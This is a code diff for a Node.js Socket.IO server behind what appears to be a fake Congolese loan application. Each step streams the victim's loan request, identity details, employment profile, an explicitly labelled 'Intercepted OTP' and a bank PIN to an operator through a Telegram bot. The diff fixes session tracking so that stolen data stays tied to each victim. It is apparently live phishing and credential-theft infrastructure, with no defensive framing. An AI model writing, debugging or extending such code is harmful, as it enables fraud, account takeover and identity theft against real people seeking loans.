@@ -34,39 +34,46 @@ app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
 });
 
 io.on('connection', (socket) => {
-    // Generate unique Congo application session tag
-    const appId = `COD-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
+    // Generate unique initial Congo application session tag
+    const initialAppId = `COD-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
     
-    // Send AppID back to the frontend right away
-    socket.emit('session-ready', { appId: appId });
+    // Send initial AppID back to the frontend right away
+    socket.emit('session-ready', { appId: initialAppId });
 
-    // FIX BUG 3 & 4: Explicit room listener matching frontend: this.socket.emit('join-room', data.appId)
+    // Explicit room listener matching frontend: this.socket.emit('join-room', data.appId)
     socket.on('join-room', (room) => {
         socket.join(room);
         console.log(`🔌 Congo User joined room: ${room}`);
     });
 
-    // Standard Log Streams
-    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 1: Loan Request", data, false));
-    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 2: Identity Profile", data, false));
+    // Extract correct data context properties sent from client to keep tracking synchronized
+    socket.on('step1', (data) => {
+        const currentId = data.appId || initialAppId;
+        botManager.sendToAdmin(currentId, "🇨🇩 Step 1: Loan Request", data, false);
+    });
+
+    socket.on('step2', (data) => {
+        const currentId = data.appId || initialAppId;
+        botManager.sendToAdmin(currentId, "🇨🇩 Step 2: Identity Profile", data, false);
+    });
     
-    // FIX BUG 1: Matched to frontend event 'step3-data'
     socket.on('step3-data', (data) => {
-        botManager.sendToAdmin(appId, "🇨🇩 Step 3: Employment Profile", data, false);
+        const currentId = data.appId || initialAppId;
+        botManager.sendToAdmin(currentId, "🇨🇩 Step 3: Employment Profile", data, false);
     });
 
-    // FIX BUG 1: Matched to frontend event 'step4-otp'
     socket.on('step4-otp', (data) => {
-        botManager.sendToAdmin(appId, "🇨🇩 Step 4: Intercepted OTP", data, true);
+        const currentId = data.appId || initialAppId;
+        botManager.sendToAdmin(currentId, "🇨🇩 Step 4: Intercepted OTP", data, true);
     });
 
-    // FIX BUG 1 & 6: Matched to frontend event 'step5-pin' and extracts data.pin correctly
     socket.on('step5-pin', (data) => {
-        botManager.sendFinalApproval(appId, data.pin);
+        const currentId = data.appId || initialAppId;
+        botManager.sendFinalApproval(currentId, data.pin);
     });
 
     socket.on('disconnect', () => {
-        console.log(`🔌 User disconnected: ${appId}`);
+        console.log(`🔌 User disconnected socket connection reference.`);
     });
 });
 
